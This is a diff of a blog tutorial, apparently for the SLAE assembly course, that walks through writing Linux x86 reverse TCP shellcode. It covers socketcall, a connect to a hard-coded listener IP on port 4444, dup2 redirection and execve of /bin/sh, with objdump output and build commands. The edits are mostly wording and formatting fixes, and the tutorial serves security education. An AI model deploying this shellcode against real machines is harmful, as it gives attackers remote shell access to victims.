@@ -6,13 +6,13 @@ categories: [SLAE, Assembly]
 ---
 ## Creating Shell Reverse TCP Shellcode
 
-The proper steps for a Bind Shell are as follows:
+The proper steps for a Reverse Shell are as follows:
 1. Creating the socket
 2. Connect to an IP and port
 3. Redirect output
 4. Execute a shell
 
-#### In order to easily translate the calls in to assembly, lets build the Bind Shell in C first.  Then we will be able to translate it from there.
+In order to easily translate the calls in to assembly, let's build the Reverse Shell in C first.  Then we will be able to translate it from there.
 
 ## Creating a Reverse Shell in C
 
@@ -66,7 +66,8 @@ A quick reminder of arguments and calls for assembly:
 
 ### Creating the socket
 
-Sockets are handled through socketcall()\
+Sockets are handled through socketcall()
+
 http://man7.org/linux/man-pages/man2/socketcall.2.html
 ```c
 int socketcall(int call, unsigned long *args);
@@ -81,11 +82,15 @@ cat /usr/include/linux/net.h | grep SYS_
 #define SYS_LISTEN	 4		/* sys_listen(2)		*/
 #define SYS_ACCEPT	 5		/* sys_accept(2)		*/
 ``` 
-Looking at our C code, we need to call socket(2, 1, 0);\
-This will translate to:\
-    EAX - 0x66 for socketcall\
-    EBX - 1 fo socket\
-    ECX - address on stack with args 2, 1 0\
+Looking at our C code, we need to call socket(2, 1, 0);
+
+This will translate to:
+
+    EAX - 0x66 for socketcall
+    
+    EBX - 1 for socket
+    
+    ECX - address on stack with args 2, 1 0
 ```asm
 ; clear registers while avoiding nulls
 xor eax, eax
@@ -98,7 +103,7 @@ mov al, 0x66
 ;0x1 for socket
 mov bl, 0x1
 ```
-Setting up ECX - our *args parameter - we can use the stack to push the values then make ecx the stack pointer so that we have the address for the args.  Note that when using the stack for args in this way, we have to push them in the reverse order due to the way the stack works (FILO).
+Setting up ECX - our *args parameter - we can use the stack to push the values then make ECX equal the stack pointer's value so that we have the address for the args from the stack.  Note that when using the stack for args in this way, we have to push them in the reverse order due to the way the stack grows towards 0.
 ```asm
 ; ecx = 0
 push ecx
@@ -110,22 +115,31 @@ push 0x2
 mov ecx, esp
 int 0x80
 ```
-Return value will be sockfd stored in EAX.  Since EAX is used for our socketcall argument, we need to move it to a register for safe keeping which will be edi.
+Return value will be the sockfd which is stored in EAX.  Since EAX is used for our socketcall argument, we need to move it to a register for safe keeping.  I will be using edi.
 ```asm
 mov edi, eax
 ```
 ### Connect to an IP and port
-Now that we have the sockfd, it's time to connect the socket to an IP and port.\
-\
-As we created earlier, our reference is:\
+Now that we have the sockfd, it's time to connect the socket to an IP and port.
+
+As we created earlier, our reference is:
+
 int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
-Just for my own understanding, I'll write out the socketcall format with any structs or objects in {}.\
-socketcall( SYS_CONNECT, {sockfd, {AF_INET, 4444, [IP]}, 0x10} );\
-EAX - 0x66\
-EBX - 0x3\
-ECX - pointing to stack:\
-STACK: edi, point to struct, 0x10, struct{0x2, 0x115C, 0x83f7a8c0}\
-\
+
+Just for my own understanding, I'll write out the socketcall format with any structs or objects in {}.
+
+socketcall( SYS_CONNECT, {sockfd, {AF_INET, 4444, [IP]}, 0x10} );
+
+EAX - 0x66 - socketcall
+
+EBX - 0x3 -SYS_CONNECT
+
+ECX - pointing to stack:
+
+STACK: edi, point to struct, 0x10, struct{0x2, 0x115C, 0x83f7a8c0}
+
+0x115C is the port number and 0x83f7a8c0 is the IP of my netcat listener.
+
 Lets build this in assembly now:
 ```asm
 mov al, 0x66
@@ -149,22 +163,33 @@ int 0x80
 ```
 ### Redirect output
 Now that we have accepted the connection, we need to redirect in, out, & err.
-The return value for accept is the descriptor for the client connection, which will be used as an argument for dup2 in ebx.  We can just move this from eax to ebx first.\
-dup2(client_socket, 0);\
-dup2(client_socket, 1);\
-dup2(client_socket, 2);\
-This translates to:\
-EAX - 0x3f\
-EBX - return value from accept\
+
+The return value for accept is the descriptor for the client connection, which will be used as an argument for dup2 in the EBX register.  We can just move this from EAX to EBX first.
+
+dup2(client_socket, 0);
+
+dup2(client_socket, 1);
+
+dup2(client_socket, 2);
+
+This translates to:
+
+EAX - 0x3f
+
+EBX - return value from accept
+
 ECX - integer 2, 1, or 0
-Since this is the same call 3 times and the only difference is an increasing (*hint* or decreasing) int.. this looks like a loop would be best to use here.\
+
+Since this is the same call 3 times and the only difference is an increasing (*hint* or decreasing) int.. this looks like a loop would be best to use here.
+
 Luckily, our loop only needs to decrease from 2.  ECX can be used as the counter AND the argument, which helps us out a lot here.
 
 Grab the syscall number for dup2:
 ```c
 cat /usr/
 ```
-There is a conditional jump in assembly called jns which means, as I understand it, "Jump No Sign".  Which will take the jump until the Sign Flag is set.  Easier description.. Take the jump until the value becomes negative.\
+There is a conditional jump in assembly called jns which means, as I understand it, "Jump No Sign".  Which will take the jump until the Sign Flag is set.  As an easier description.. Take the jump until the value becomes negative.
+
 This conditional jump is perfect for us because it will include 0 in our loop before exiting.
 ```asm
         mov ebx, eax    ; client_socket arg
@@ -177,11 +202,16 @@ dup:
         jns dup
 ```
 ### Execute a shell
-Now we just need to execute /bin/sh with execve to give the client the shell.\
-The call will be:\
-execve("/bin/sh", NULL, NULL);\
-We have to null terminate the string for "/bin/sh" so we will use the stack to assign it to the proper register.\
+Now we just need to execute /bin/sh with execve to give the client the shell.
+
+The call will be:
+
+execve("/bin/sh", NULL, NULL);
+
+We have to null terminate the string for "/bin/sh" so we will use the stack to assign it to the proper register.
+
 EDX is still 0'd out so we can keep it the same and also use it to make ECX 0.
+
 Note that, for ease of writing, we want 8 characters for our string.  We can do "/bin//sh" to effectively give the same command and have the proper length.  We also want to reverse the string, split it in to 4 character sections and push it on to the stack in hex.
 ```asm
 push edx  ; null terminate the string
@@ -354,7 +384,7 @@ Disassembly of section .text:
  80480cb:	b0 0b                	mov    al,0xb
  80480cd:	cd 80                	int    0x80
  ```
- No null bytes so we are good keep moving forward.
+ No null bytes so we are good to keep moving forward.
  
  Extract bytes:
  ```shell
@@ -384,7 +414,9 @@ main()
  ```shell
  gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
  ```
- Now it should be good to run! Start your listener, then run your reverse_shell:
+ Now it should be good to run! 
+ 
+ Start the listener, then run the reverse_shell:
  ```shell
  ./shellcode
 Shellcode Length:  79
